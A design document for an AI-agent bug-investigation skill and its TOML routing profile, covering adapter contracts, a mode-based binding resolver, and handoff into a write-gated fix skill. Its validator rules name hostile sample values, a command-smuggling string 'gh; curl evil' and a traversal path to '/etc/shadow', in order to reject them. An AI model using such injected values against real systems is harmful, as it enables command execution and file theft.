# Design — stack-adaptive bug loop MVP (`detect-stack` + generic `investigate-bug`)

**Status:** **FROZEN 2026-06-07** (`apex:design-review` passed — six-lens cold adversarial re-pass; all blockers + NITs resolved; verdict + STRIDE table in `design-review.md`) · **Slug:** `stack-adapters`
**PRD:** `prd.md` (FROZEN 2026-06-07). Design-review verdict: `design-review.md`.
**Composes (does not duplicate):** `skills/autonomous-fix/SKILL.md` (the shipped write gate; this design re-implements none of its rails). Format + depth exemplar: `docs/incident-retro/design.md`, `docs/autonomous-fix/design.md`.
**Resolves at design time (PRD §7):** `apex:api-surface-review` on the adapter contract + profile schema, BEFORE PR-A is cut (§A below). This is the durable, every-future-adapter-implements-it contract — the highest-cost decision (U2).

---

## Shape (one paragraph)

Two skills + two shipped adapters + one in-repo TOML, sitting **in front of** the shipped `autonomous-fix` gate without re-implementing any of its write rails. `apex:detect-stack` (a new `/apex:detect-stack` command + skill) probes a repo's deps / env-var *names* / CI configs / connected MCP servers and writes a **routing-only** `apex.profile.toml` — value-shape-validated, no secrets, two bindings per *routed* axis. Generic `apex:investigate-bug` (invoked by name, no new command) **reads** that profile, resolves each axis to a binding **by mode** (interactive→MCP-first; unattended→CLI-only), runs the gate's read-only P2 + P3 *inside the gate's own allowlist*, and **hands the reproduced red test + `PLAN.json` + a nonce-fenced bug-context bundle into the gate's P4**. The seam is **`autonomous-fix` P3→P4** — from P4 on, every write rail is the gate's, unchanged. BookBridge's `investigate-bug` becomes a **thin consumer** of generic `apex:investigate-bug` (the three-layer chain: BookBridge → generic → gate). The MVP ships exactly two adapters — GitHub-tracker via `gh`, console-logs via `grep` — both backends every repo already has; zero vendor integrations; no obs adapter (PR-C, deferred).

The design is laid out so **compose-not-duplicate is structurally unbreakable**: investigate-bug operates *inside* the gate's invocation-#1 read-only allowlist, so "writes no source" is **inherited from the staged allowlist** (§E.3), not asserted by markdown. The parent/child model is fixed by the **direction of the call**: the gate is the WRITE-GATE parent investigate-bug calls *into* (P4); generic investigate-bug is the DIAGNOSIS parent BookBridge calls *into*.

---

## §A — The adapter capability contract (U2 — resolved via api-surface-review)

This section IS the `apex:api-surface-review` pass the PRD mandates before PR-A. The five passes are applied to the proposed adapter contract + profile schema below; the verdict drives the schema PR-A freezes.

### A.0 — Decision: per-axis small interfaces, NOT one uniform interface

**One uniform `Adapter` interface (rejected).** A single `query(verb, args) -> dict` (or an abstract base with every verb) forces a tracker adapter to carry a `query_logs` method it can't implement and an obs adapter to carry `fetch_issue`. That is the **api-surface-review Pass 4 (scope) failure** — an interface whose docstring needs an `and` ("a thing that fetches issues *and* queries logs *and* lists commits"). It also defeats AC4's conformance proof (S9): "implements the contract" becomes ambiguous when half the methods are `NotImplementedError`. And it invites api-surface-review Pass 1 noise — uniform return envelopes that echo the verb name back.

**Per-axis small interfaces (chosen).** Each axis is its own tiny capability with its own verbs and its own normalized return shape. There is **no base class** — an adapter is "a thing exposing this axis's verbs with these return shapes." Conformance (S9) is then mechanically checkable per axis: "does this module expose `fetch_issue(ref) -> NormalizedIssue` and `comment(ref, body) -> None`?" The axes do **not** unify because their verbs, arguments, and returns genuinely differ — forcing them together is the premature abstraction api-surface-review exists to catch. The **only** shared structure is the two-binding resolution mechanic (§B), which is *orthogonal* to the verb contract: the resolver picks `mcp` vs `cli` and the adapter behind either binding satisfies the same per-axis verb contract.

**Why this is the highest-cost error and why per-axis is the safe cut:** an over-uniform contract leaks into every future adapter (PR-C/D/E) and every consumer (BookBridge); a too-narrow per-axis contract that misses a verb is a *local* PR-C addition. Per-axis under-commits — it freezes only the two verbs each MVP axis demonstrably needs, and S9's stub conformance test is the freeze-check that a third adapter drops in with zero `investigate-bug` diff.

### A.1 — The tracker axis contract

Two verbs. `fetch_issue` is read in P2/P3. The *write*-shaped verb (`comment`) is a **contract verb the adapter must expose**, but in the MVP it is called by **neither** investigate-bug **nor** the gate — only by a **downstream consumer post-handoff** (e.g. BookBridge's comment-back step). investigate-bug owns no terminal write (§E.4); the gate writes its own GitHub comment via its own `gh` on the ESCALATE hard leg (`SKILL.md:96`), **not** through a routed `tracker.comment` adapter (the gate has no profile/adapter awareness). The verb is on the *axis's* contract because a future tracker (Linear/Jira, PR-D) must implement both read and comment for whatever consumer posts back — not because investigate-bug or the gate exercises it.

```
tracker.fetch_issue(ref: str) -> NormalizedIssue        # READ — P2
tracker.comment(ref: str, body: str) -> None            # WRITE — contract verb; in MVP called only by a downstream consumer post-handoff, NOT by investigate-bug or the gate
```

**`ref`** is the profile-agnostic issue handle a human or the gate passes (`"123"`, a URL, or `owner/repo#123`). The adapter normalizes it against `[vcs] repo` / `[tracker]` config.

**`NormalizedIssue`** — the normalized return shape every tracker adapter (gh, and PR-D's Linear/Jira) must produce. Field-by-field necessity (api-surface-review Pass 1):

```python
@dataclass(frozen=True)
class NormalizedIssue:
    id: str                  # canonical id in the tracker's own scheme ("123", "ENG-456")
    title: str               # KEPT: distinct from body; goes inside the gate's nonce fence
    body: str                # KEPT: the symptom text; the diagnosis input
    labels: list[str]        # KEPT: investigate-bug reads severity/risk hints (raise-only, gate P1)
    comments: list[str]      # KEPT: bodies only — follow-up repro details land in comments
    url: str                 # KEPT: the ONE field the caller can't compute; used in the gate's PR back-link
```

Pass-1 deletions made up front (so the contract ships lean, not trimmed later):
- **No `author`** — investigate-bug never branches on who filed it; identity is the gate's P1 risk input via `labels`, not free-form author. (api-surface-review Pass 1 item 3: caller takes no action on it.)
- **No `created_at` / `updated_at`** — the failure *window* comes from the issue body / the user, not the issue timestamp; carrying it invites a wrong "query logs around filing time" heuristic. Deleted; re-add in PR-C only if an obs adapter proves it needs it.
- **`comments` is `list[str]` (bodies), not structured comment objects** — investigate-bug reads comment *text* for repro hints; comment author/timestamp is Pass-1 noise. A future need (e.g. "skip bot comments") is a PR-D addition, not an MVP guess.

**Error shape (api-surface-review Pass 2 — human + machine, nothing else):** verbs raise a single `AdapterError(code: AdapterErrorCode, message: str)` — `code` ∈ `{NOT_FOUND, AUTH, RATE_LIMIT, UNAVAILABLE, MALFORMED}` (machine-branchable), `message` (human). No `kind`+`level`+`category`. `RATE_LIMIT` and `AUTH` map to the gate's fail-closed posture (a rate-limit storm = the same storm that exhausts spend → the gate's P1 HALT, §E.5).

### A.2 — The observability axis contract

One verb. The MVP's only obs adapter is console-logs/grep; the contract is shaped so PR-C's Datadog/Sentry adapter drops in (forward-compat only — U4).

```
observability.query_logs(window: TimeWindow, query: str | None = None) -> list[LogLine]
```

**`window: TimeWindow`** = `(start: datetime, end: datetime)` — the failure window. For the console adapter this filters by a parsed timestamp prefix; for PR-C's Datadog adapter it is the API time-range. Making the window a **required positional** (not a default "last 1h") is api-surface-review Pass 3: an unbounded log query is the DoS amplifier (§F STRIDE-D) — the caller must state the window.

**`query: str | None`** — an optional free-text filter (a `request_id`, an error substring). For grep it's the pattern; for PR-C it's the backend query string. Optional because the window alone is a valid query (give me everything in the window).

**`LogLine`** — the normalized return:

```python
@dataclass(frozen=True)
class LogLine:
    ts: datetime             # KEPT: parsed timestamp; the window-membership oracle (S8 asserts in-window only)
    text: str                # KEPT: the raw line content — the diagnosis evidence
    source: str              # KEPT: which file/stream the line came from — MVP-real, not PR-C forward-compat (see note)
```

**`source` is MVP-real, not deferred (Pass-1 consistency check):** unlike `created_at` (deleted because carrying it is *actively harmful* — it invites a wrong "logs around filing time" heuristic), `source` is load-bearing the moment the console adapter greps **more than one path/stream** — which it can do even in the MVP (e.g. `app.log` + `error.log`, or stdout + stderr). With a multi-path grep the caller *does* branch on `source` (which file a line came from is part of the evidence). So `source` earns its place by the api-surface-review item-3 test in the MVP, not on PR-C "multi-service" reasoning — this is the distinction from the `created_at` cut. (PR-C's per-service value is then a *free additive* meaning, protected by the S9 zero-diff property.)

Pass-1 deletions: **no `severity`/`level`** parsed by the contract — severity lives *in* `text` and parsing it is backend-specific (a console adapter can't reliably parse arbitrary log formats); a consumer that wants severity greps `text`. **No `request_id` field** — it's in `text`; promoting it to a typed field is a parser the console adapter can't honor uniformly (api-surface-review Pass 1 item 4: redundant with `text`). PR-C MAY add structured fields *as an additive superset* without changing the MVP contract (the S9 zero-diff property protects this).

### A.3 — The vcs / reproduce non-axes (AC2 exemption, made explicit)

**`vcs` is NOT an adapter** — `git`/`gh` is the universal substrate. Suspect-commit listing is a direct read *inside* investigate-bug, not a routed verb:

```
# Not an adapter interface — an inline helper investigate-bug calls directly:
recent_commits(paths: list[str], since: datetime) -> list[CommitRef]   # = `git log --since=<> -- <paths>`
```

`CommitRef` is the third normalized dataclass (named in the frozen contract, A.4) — defined here field-by-field for completeness, same Pass-1 discipline as `NormalizedIssue`/`LogLine`:

```python
@dataclass(frozen=True)
class CommitRef:
    sha: str                 # KEPT: the canonical handle; what the diagnosis cites as a suspect commit
    subject: str             # KEPT: the first commit-message line — the human-readable "what changed"
    ts: datetime             # KEPT: when — orders suspects against the failure window (the since= bound)
    paths: list[str]         # KEPT: the files this commit touched within the queried paths — the suspect surface
```

Pass-1 deletions: **no `author`** (investigate-bug never branches on who committed — blame is a diagnosis aid the human reads in the PR, not a routing input); **no full body** (`subject` suffices for the suspect list; the full message is a `git show` away if the human wants it). This is documented as a plain helper over `git`, **not** a two-binding axis — there is no `mcp` vs `cli` choice (git is always the CLI). The PRD's AC2 exempts `vcs` for exactly this reason; encoding it as an adapter would be the over-uniform error A.0 rejects.

**`reproduce` is NOT an adapter** — it's a *command field* (`[reproduce] local = "docker-compose up && make test-e2e"`). investigate-bug *runs* the command (the gate's P3 oracle runs the emitted test); it does not route to a tool. The reproduce *technique* is `superpowers:systematic-debugging` (external companion), not re-taught here.

### A.4 — api-surface-review verdict (the five passes, applied)

| Pass | Finding | Resolution |
|---|---|---|
| **1 — necessity** | `NormalizedIssue` originally carried `author`/`created_at`; `LogLine` carried `severity`/`request_id` | **Deleted all four** up front (A.1/A.2). The contract ships lean — `url` and `ts` are the only fields the caller can't trivially compute. |
| **2 — error shape** | risk of `kind`+`level`+`category` error envelopes per adapter | **One `AdapterError(code, message)`**, code ∈ a 5-value enum that maps to the gate's fail-closed terminals (§E.5). |
| **3 — timeouts/magic numbers** | `query_logs` default window; per-adapter timeouts | **No default window** (required positional — DoS bound). Per-adapter call timeouts are the *adapter's* concern, justified against its substrate (`gh` default, grep bounded by file size), not hardcoded in the contract. |
| **4 — scope** | one uniform `Adapter.query()` would be a 3-verb orchestrator | **Per-axis interfaces** (A.0). Each verb's docstring is one sentence, no `and`. |
| **5 — producer/consumer dual** | tempting to have investigate-bug post-process raw `gh`/`grep` output (consumer-side) | **Producer-side normalization** — the adapter returns `NormalizedIssue`/`LogLine`; investigate-bug never parses raw `gh --json` or raw grep lines. This is what makes S8 (adapter-verb units) and S9 (stub conformance) testable in isolation. |

**Frozen contract (what PR-A's schema + PR-B's adapters implement):** two per-axis interfaces (tracker: `fetch_issue`+`comment`; observability: `query_logs(window, query?)`), three normalized dataclasses (`NormalizedIssue`, `LogLine`, `CommitRef`), one `AdapterError(code, message)`. **This is the durable U2 contract every future adapter implements.** S9 is its first conformance test.

---

## §B — The interactive-vs-unattended two-binding resolver (AC2 + AC3)

The single most load-bearing runtime mechanic: **MCP-only must be impossible** because it would die headless in the `autonomous-fix` CI path. The profile carries **both** bindings per routed axis; the resolver picks by **mode**.

### B.1 — The binding model (per routed axis)

Each routed axis (`tracker`, `observability`) resolves to exactly one of:

```
{ interactive: mcp = "mcp__<vendor>__*" }     # session MCP via ToolSearch — interactive only
{ unattended:  cli = "<bare command>"   }     # CLI/HTTP — works headless
{ hard fallback: ask-user }                   # neither binding resolves
```

Both `mcp` and `cli` fields are **always present** in the profile for a routed axis (AC2a field-presence; empty string allowed). The resolver — pure code, unit-testable over a fixture profile — is:

```python
def resolve(axis_cfg: AxisConfig, mode: Mode) -> Binding:
    if mode is Mode.UNATTENDED:
        # CLI-ONLY. An mcp__* resolution attempt here is a HARD FAILURE (AC3).
        if axis_cfg.cli:
            return CliBinding(axis_cfg.cli)
        return AskUserBinding(reason="no cli binding; unattended cannot use mcp")  # → gate ESCALATE
    else:  # INTERACTIVE — MCP-first, CLI fallback, ask-user last
        if axis_cfg.mcp and mcp_server_connected(axis_cfg.mcp):   # ToolSearch probe
            return McpBinding(axis_cfg.mcp)
        if axis_cfg.cli and cli_on_path(axis_cfg.cli):
            return CliBinding(axis_cfg.cli)
        return AskUserBinding(reason="paste the issue/logs")
```

The two liveness probes the interactive ladder hinges on have one-line contracts (pinned so PR-B doesn't invent divergent definitions, N2):
- `mcp_server_connected(prefix: str) -> bool` — a **ToolSearch probe**: returns True iff at least one tool whose name matches `prefix` (e.g. `mcp__github__*`) is **schema-loaded and callable this session** (not merely name-listed in the deferred set). The "callable" bar, not the "listed" bar, is what makes the interactive MCP-first branch safe.
- `cli_on_path(cmd: str) -> bool` — returns True iff the bare command resolves on `PATH` (a `shutil.which`-shaped check); it does **not** execute the command.

**The structural guarantee that MCP-only is impossible:** the resolver **never reads `axis_cfg.mcp` in the unattended branch.** A profile with `tracker.cli=""` and `tracker.mcp="mcp__github__*"` resolves, *unattended*, to `AskUserBinding → escalate` (S5.2) — it **never** attempts the MCP prefix. This is the AC3 fail-path: a run that tries to resolve an `mcp__*` prefix on the unattended path fails. The check is a single code path with a single test (S5.2: `cli="" → AskUserBinding`, asserting the `mcp` field was never touched).

**Why two bindings, not one with a runtime probe:** the profile records *availability* (what this repo declared at detect time), not *liveness*. The resolver does the liveness probe (`mcp_server_connected` / `cli_on_path`) at investigate time. Recording both means the CI path has its binding *without* a session MCP ever existing — the whole point. A single "current" binding would either bake in the interactive choice (breaking CI) or the CLI choice (wasting the interactive MCP a dev has connected). The two-binding profile is the API-surface property that makes the mode split a *data* property, not a code fork in every adapter (api-surface-review Pass 5: producer-side — the profile carries it; consumer-side would be every adapter re-deciding).

### B.2 — Mode source (1:1 with the gate)

`Mode` maps **1:1 onto `autonomous-fix`'s interactive/autonomous split** (`SKILL.md:41-43`, "Two modes, one rail set"). Interactive = a dev running it locally (session MCP may exist). Unattended = the gate's CI context (no session MCP). The mode is **not** investigate-bug's to invent — when investigate-bug runs *inside* the gate's invocation #1, it inherits the gate's mode. Standalone interactive use is the dev path. This keeps the two-mode split single-sourced at the gate, not duplicated.

### B.3 — Hard-fallback honesty (AC4 — never a silent stub)

`AskUserBinding` is a **real terminal**, not a no-op:
- **Interactive:** prompt "paste the issue body / paste the log lines for window X."
- **Unattended:** there is no human to paste → the binding escalates into the **gate's ESCALATE terminal** (§E.6). It never silently returns `[]` and proceeds (the S7/AC4 silent-stub failure).

An **unsupported `kind`** (`[tracker] kind="jira"`, no shipped adapter) resolves to `AskUserBinding` the same way — the dispatch table has no Jira entry, so there is no stub returning nothing; interactive prompts, unattended escalates (S7).

---

## §C — `apex.profile.toml` schema + loader (AC1, AC7)

In-repo, routing-only, NO secrets. Machine-written by detect-stack, read by investigate-bug. TOML with its **own loader** (not the `memory-note`/`domain-knowledge` prose schema — different lifecycle: shared, in-repo, machine-written, structured config; brief §3 decision).

### C.1 — Schema

```toml
# apex.profile.toml — routing config only. NO secrets, ever.
# Written by /apex:detect-stack; read by apex:investigate-bug.

[tracker]                       # ROUTED axis → both bindings required (AC2)
kind = "github"                 # enum: github | linear | jira | azure-boards | manual
mcp  = "mcp__github__*"         # interactive binding (ToolSearch prefix). MAY be "".
cli  = "gh"                     # unattended binding (bare command). MAY be "".
bug_label = "bug"               # free string (optional)

[observability]                 # ROUTED axis → both bindings required (AC2)
kind = "console"                # enum: datadog | sentry | otel-honeycomb | cloudwatch | azure-monitor | console
mcp  = ""                       # console has no MCP server — empty, present (AC2a)
cli  = "grep"                   # the universal backend
log_path = "logs/app.log"       # console-only: repo_path field-kind — repo-relative, no `..`, realpath under repo root (C.2)
# secret_ref = "DD_API_KEY"     # RESERVED for PR-C (Datadog/Sentry). env-var NAME only: [A-Z][A-Z0-9_]*. NOT written by MVP detect-stack (no consumer resolves it; writing it leaks secret topology — F3). Allowlist validates it IF a PR-C profile carries it.
# service = "payments-api"      # RESERVED for PR-C (multi-service disambiguation). identifier field-kind. NOT emitted by the MVP console adapter (single log_path); see LogLine.source note in A.2.

[vcs]                           # DESCRIPTOR field — NOT a routed axis (AC2 exempt)
host = "github"                 # identifier
repo = "owner/apex"             # identifier

[reproduce]                     # COMMAND field — NOT a routed axis (AC2 exempt)
local = "docker-compose up && make test"   # free string (a command)
staging_url = "https://staging.example.com"
```

### C.2 — The value-shape allowlist (AC1 — decidable "no secrets")

The loader validates **every field's value against its declared field-kind's shape**. This is what makes "no credential value" *decidable*, not a regex guess. A field whose value fails its shape → **AC1 fail** (S1.2):

| Field-kind | Fields | Shape rule |
|---|---|---|
| `enum` | `kind` (per axis) | ∈ the axis's fixed enum |
| `mcp` | `mcp` | matches `mcp__*` prefix, OR empty |
| `cli` | `cli` | bare command name `[a-z][a-z0-9_-]*`, OR empty (no path separators, no flags — defends against a smuggled `gh; curl evil` value) |
| `identifier` | `service` (PR-C only — see note), `repo`, `host` | identifier chars only `[A-Za-z0-9._/-]` — **rejects a token-shaped value** (the AC1 "token where an identifier expected" case). These are **descriptors** (the adapter names a backend with them; it never opens/executes them), so shape alone is sufficient. |
| `repo_path` | `log_path` | **a path the console adapter will OPEN and read** — so shape is NOT sufficient; it gets a *confinement* rule, not just a charset. Repo-relative only: **no absolute paths, no `..` segment, and the resolved realpath MUST stay under the repo root.** Rejects `../../../../etc/shadow` and a symlink that escapes the tree. The console adapter MUST itself confine its read to the repo tree (defense-in-depth, in case a profile bypasses the loader). This is the field whose legitimate values *require* path separators, so the `cli` "no separators" defense can't apply — confinement is its analogue. |
| `secret_ref` | `secret_ref` (PR-C only — see note) | **env-var NAME `[A-Z][A-Z0-9_]*`** — NEVER a value. A value that looks like a token (length+entropy) fails. |
| `free` | `bug_label`, `reproduce.*` | free string |

**The decidability claim:** "no credential in the profile" reduces to "every field value matches its field-shape" — checkable mechanically (the AC1 lint, a PR-A artifact mirroring the `autonomous-fix` `conformance-lint.py` precedent at `skills/autonomous-fix/reference/conformance-lint.py`). The lint is the AC1 enforcement surface; S1.2 is its unit test. **Boundary:** this is the `autonomous-fix` AC8 no-leak invariant *applied to the config file* — the gate's AC8 detector is project-supplied; this design supplies the value-shape rule for the profile specifically.

**The descriptor-vs-operation distinction (the principle behind the `repo_path` split, made explicit so it isn't re-derived per field):** a routing field that the adapter only ever *names a backend with* (`repo`, `host`, `kind`, `service`) needs only a **shape** check — it is never opened as a path or executed as a command, so a malformed value at worst yields a NOT-REPRO. A routing field that becomes a **file or command operation** (`log_path` → a filesystem read; `cli` → a process name) needs **more than shape**: `log_path` gets path-confinement, `cli` gets the no-separators/no-flags rule. F1's blind spot was treating `log_path` as a descriptor when it is an operation. The `vcs.repo`/`host` and `secret_ref`-name fields stay shape-only precisely because they are descriptors the adapter never opens.

**`service` and `secret_ref` are PR-C forward-compat fields, NOT in the MVP `apex.profile.toml` (§C.1):** the `service` row above and the `secret_ref` row exist in the allowlist so the AC1 lint already covers them when PR-C's obs adapter introduces them — they are validated-if-present, like a reserved keyword. **MVP detect-stack does NOT auto-populate either field** (disclosure delta, F3): writing `secret_ref = "STRIPE_SECRET_KEY"` into a committed file reveals the project's secret topology (which vendors, which credential names) with **zero offsetting MVP function** — no consumer resolves it (the resolution path is PR-C, §F.2). So the §D.1 env-var-NAMES probe that records `secret_ref` is **PR-C, not PR-A**; the MVP schema (§C.1) carries neither `service` nor `secret_ref` as an emitted field — only the schema *slot* is reserved (forward-compat). A reader will not find `service`/`secret_ref` in an MVP-written profile.

### C.3 — Loader contract

```python
def load_profile(path: Path = Path("apex.profile.toml")) -> Profile | ProfileError:
    # 1. parse TOML (tomllib, stdlib). Malformed → ProfileError(MALFORMED).
    # 2. value-shape validate every field (C.2). Any fail → ProfileError(SHAPE_VIOLATION, field).
    # 3. AC2 field-presence: each routed axis has both mcp+cli keys present. Missing → ProfileError(MISSING_BINDING).
    # 4. return frozen Profile dataclass (per-axis AxisConfig).
```

`load_profile` is the single read point. A **malformed/absent** profile → investigate-bug prompts "run `/apex:detect-stack` first" (interactive) or HALTs "no profile" (unattended) — never proceeds on a guessed stack (S7 edge). The loader **shape-validates on read too** (not just on write) — a human hand-edit that smuggles a token is caught at investigate time, not silently routed.

---

## §D — `apex:detect-stack` (PR-A)

A new skill + the 15th `/apex:` command. Probes → auto-fills inferable → prompts for the rest (U1 = AC7). Writes/updates `apex.profile.toml`.

### D.1 — The probe set

**Three** detectors ship in the MVP (deps / CI / connected-MCP); the env-var-NAMES probe is **PR-C** (F3 — no MVP consumer resolves a `secret_ref`, and writing one is pure secret-topology disclosure). The PR-A LOC body the PRD flags for a possible A1/A2 split:

| Probe | Source | Infers |
|---|---|---|
| **deps** | `package.json` / `pyproject.toml` / `requirements.txt` / `Gemfile` | tracker+obs *kind* evidence (a `@datadog/*` dep → obs `kind="datadog"`; `sentry-sdk` → sentry). Malformed manifest → skip with a noted gap, never crash (S10 edge). |
| **env-var NAMES** (**PR-C, not PR-A** — F3) | `.env.example`, CI workflow `env:` blocks, `docker-compose.yml` | `secret_ref` *names* (`DD_API_KEY` present → record the name, never a value). **Deferred to PR-C:** the MVP has no obs adapter to resolve a `secret_ref`, so writing one into a committed profile is pure secret-topology disclosure with no MVP function — this probe lands with the PR-C obs adapter that consumes it. |
| **CI configs** | `.github/workflows/*`, `.gitlab-ci.yml`, `.circleci/` | the unattended-context evidence + conflicting-signal detection (github remote + `.gitlab-ci.yml` → S10/U7). |
| **connected MCP** | ToolSearch probe (`mcp__*__` prefixes available this session) | the `mcp` binding per axis. **Interactive-only** — unattended re-detect is structurally blind here (U8). |

`vcs` is read directly from `git remote get-url origin` (host + repo). Always inferable; never prompted.

### D.2 — The conflicting-signal rule (S10 / U7)

When two incompatible signals appear for one axis (github.com remote **and** `.gitlab-ci.yml`):
- **Interactive:** record the conflict, **prompt** the user to pick — never silently pick one.
- **Unattended re-detect:** write a placeholder `# TODO: resolve (github remote + gitlab CI detected)` — never fabricate.

Conflict representation in the profile (U7): the axis is written with the **detected-but-unresolved** kind left as a placeholder + a `# TODO:` comment naming both signals. investigate-bug on an unresolved-placeholder axis routes to ask-user (it can't route a `# TODO`), not a guess.

### D.3 — Write / prompt behavior (AC7)

- **The un-inferable predicate (the buildable AC7 mechanism, S3) — pinned so PR-A's writer has a testable rule, not prose:** a field is **un-inferable iff no probe in §D.1's set produced a value for it.** Un-inferable → **prompt** (interactive) or write the honest-empty placeholder `field = "" # TODO: fill` (unattended) — **never a default, never a guess.** Inferable (a probe produced a value) → auto-fill with that value. This is the predicate that distinguishes "had no signal → must prompt/placeholder" from "had a signal → may auto-fill" — the entire AC7 distinction. Example: a `@datadog/*` dep makes obs `kind="datadog"` *inferable* (the deps probe produced it) but `service` *un-inferable* (no probe produces a service name) → `kind` auto-fills, `service` prompts/placeholders. A silently-written empty/guessed field where there was no signal → **AC7 fail (S3)**.
- **AC2b no-silent-drop — the writer invariant (pinned so PR-A's writer can't pass S1.3 presence yet silently drop an available binding, S2.1):** **the writer records every binding the probe set reports available for a routed axis; dropping an available binding is the AC2b/S2.1 failure.** Field-*presence* (both `mcp`+`cli` keys exist, S1.3) is necessary but not sufficient — if the deps/CI/MCP probes report a `cli` is available, the writer MUST emit it; writing `cli=""` when a probe found `gh` on PATH is a silent drop, not an honest-empty. (Honest-empty `cli=""` is only correct when *no* probe reported it available.)
- **Re-run over an existing profile** → **update in place, preserving human-edited fields it didn't re-detect** (S1 drift / U3 / U8). Specifically (U8): an **unattended** re-detect (blind to MCP) **preserves** the prior `mcp` value — it never blanks a human/interactively-detected binding; a NEW unrouted axis found unattended gets `# TODO: fill` without destroying existing bindings. This is what reconciles AC7's unattended re-detect with AC2's both-bindings rule.

### D.4 — Distinct-from (U5 — the neighbor boundaries)

- **vs `apex:recon`** (`skills/recon/SKILL.md`): recon gathers **code-graph facts** in a *change's blast radius* for a *design*, emitting per-design prose. detect-stack profiles **bug-loop tooling** (which tracker/obs/repro this project routes through), reads **routing-relevant config signals** (deps as tracker/obs evidence, MCP presence) **not the code graph**, and emits a **machine-written routing TOML**. Different output (TOML vs prose), different lifecycle (persisted shared config vs per-design artifact), different probe-target (config signals vs code graph).
- **vs `apex:setup`** (`commands/setup.md` — a command-only entry, no `skills/setup/` exists): setup **installs apex's own companions** (superpowers / pr-review-toolkit / frontend-design / a codebase-graph tool) and detects *which apex companions are installed*. detect-stack **discovers the project's existing tooling**, installs **nothing**, and its MCP probe asks *"which vendor servers can I route a bug through"* — not setup's *"which apex companions are installed."* Install-vs-discover + a different MCP-mechanic.

---

## §E — generic `apex:investigate-bug` + the gate handoff (PR-B)

A skill invoked by name (no new command — `/apex:detect-stack` is the only command PR-A adds; investigate-bug is invoked **by name with no slash command, the way `autonomous-fix` and `incident-retro` already are** — both are skills fired by name, neither has a `commands/*.md` stub, both sit in help.md's "I FIRE THESE AUTOMATICALLY" block, not the slash menu, `commands/help.md:37,39`). It reads the profile, dispatches per axis by mode, runs the gate's read-only P2+P3 inside the gate's allowlist, and hands into the gate's P4. **It re-implements none of the gate's write rails.**

### E.1 — The diagnosis flow (read-only, routes via adapters)

```
investigate-bug <issue-ref> [mode inherited from gate or =interactive standalone]
 1. load_profile()                          # §C; absent/malformed → prompt-detect-stack | HALT
 2. tracker  = resolve(profile.tracker,  mode)   # §B
    obs      = resolve(profile.observability, mode)
 3. issue    = tracker.fetch_issue(ref)          # §A.1 — NormalizedIssue (READ)
 4. window   = derive_window(issue)              # from body / user; NOT issue timestamp (heuristic — contract below)
    logs     = obs.query_logs(window, query=ids_from(issue))   # §A.2 — list[LogLine] (READ); query=ESCAPED LITERAL (F2)
 5. commits  = recent_commits(paths_guess(logs, issue), since=window.start)  # §A.3 — git read (READ; heuristic)
 #  derive_window / ids_from / paths_guess = diagnosis heuristics (investigate-bug's territory,
 #  NOT gate rails). Their exact derivation is impl-plan detail (N3): derive_window reads the
 #  failure span from the body / asks the user, defaulting to a bounded span (never the issue
 #  timestamp); ids_from extracts error ids/substrings as ESCAPED literals; paths_guess maps log
 #  lines+issue to suspect file paths. Worst case = a wrong-but-bounded plan the gate's Stage-A
 #  check on PLAN.json still catches (§6 Tampering). PR-B specifies them; the design fixes only
 #  their contracts (inputs, untrusted-data handling, bounded worst-case), not their internals.
 6. ── HAND TO THE GATE'S READ-ONLY PHASES ──
    Run the gate's P2 (invocation #1): emit PLAN.json + write the reproducing
    test under the gate's B2 test-file-only carve-out. Run the gate's P3
    (assert-red-test): red on the unpatched tree.
 7. ── P3→P4 HANDOFF ──  (the seam; §E.3)
    pass {red test, PLAN.json, fenced bug-context bundle} into the gate's P4.
    From here every write rail is the gate's. investigate-bug STOPS.
```

Steps 1–5 are **read-only adapter routing + diagnosis** — investigate-bug's owned territory. **Untrusted-input note (F2):** steps 3–5 consume the issue body as **untrusted data** *before* the gate's P4 nonce fence applies. Two consequences are pinned here so PR-B builds them, not discovers them: (a) `ids_from(issue)` becomes the `query_logs` filter — for the grep adapter that is the grep pattern, so it MUST be an **escaped literal, never a passthrough regex** (closes the ReDoS amplifier); (b) `derive_window`/`paths_guess` are heuristics whose worst case is a **wrong-but-bounded plan** that the gate's Stage-A sensitive check on `PLAN.json` (`SKILL.md:36`) still catches — an accepted residual (§6 Tampering), not a bypass. Step 6 *instantiates the gate's own P2/P3* (it does not re-implement them — it runs them, as the gate's rails): **in the unattended/composed path steps 1–5 run *as the operating-prompt content of* the gate's invocation #1, inheriting its read-only allowlist; in standalone interactive use the allowlist guarantee is advisory** (the dev is at the keyboard — the gate's interactive mode, `SKILL.md:41-43`). Step 7 is the seam.

### E.2 — The seam, stated precisely: `autonomous-fix` P3→P4

Verified against `skills/autonomous-fix/SKILL.md` (the B1/B2 split, §"The two-invocation runner seam"; the five phases P1–P5; the four terminals):

- **Gate P2** (`SKILL.md:57-63`) = runner **invocation #1**, READ-ONLY + the **B2 test-file-only carve-out** (`SKILL.md:35`): allowlist = read tools + write-to-the-one-declared-test-path. Contract: emit `PLAN.json` (the planned source-file set) + the reproducing test, **write nothing else**.
- **Gate P3** (`SKILL.md:65-71`) = the **wrapper between invocations**: `assert-red-test` (red on the pre-fix tree, symptom-matched).
- **Gate P4** (`SKILL.md:73-79`) = runner **invocation #2**, the WRITE — sensitive-path refuse (Stage A on `PLAN.json`, Stage B on the actual diff), nonce fence, fail-closed cost cap, draft-only, **gate-owned commit**.

**The seam is P3→P4.** investigate-bug runs *inside* P2 (its adapter routing + diagnosis happen in the read-only allowlist; the one write is the reproducing test under B2) and triggers P3, then **hands the {red test + `PLAN.json` + fenced bundle} into P4**. From P4 on, **nothing is investigate-bug's.**

### E.3 — Why compose-not-duplicate is structurally unbreakable here

This is the design's load-bearing property. **"investigate-bug writes no source" is not a markdown assertion — it is inherited from the gate's staged allowlist** (`SKILL.md:59-63`, AC7b):

- investigate-bug runs in the gate's **invocation #1 allowlist**: read tools + the single declared test path. **Write tools to source are simply absent.** There is no source-write affordance to exercise — a source write here is the gate's S10 DENY, enforced by the *gate's* allowlist, not by investigate-bug's good behavior (AC5 enforcement surface: "advisory at the skill layer; enforced by the gate's read-only allowlist").
- The single write — the reproducing test file — is the **gate's B2 carve-out exercised inside the gate's invocation #1**, NOT an independent investigate-bug privilege. investigate-bug doesn't *own* a write path; it *uses* the gate's one carve-out.
- **The only edge across the seam is data:** `{red test file, PLAN.json, fenced bundle}`. investigate-bug cannot open a PR (no `gh pr create` in the read-only allowlist), cannot inspect the deny-globs (it passes `PLAN.json` so the gate's Stage-A check has its input *without* investigate-bug reading the globs — AC6), cannot carry cost logic (the budget cap wraps the gate's phases, `SKILL.md:47`).

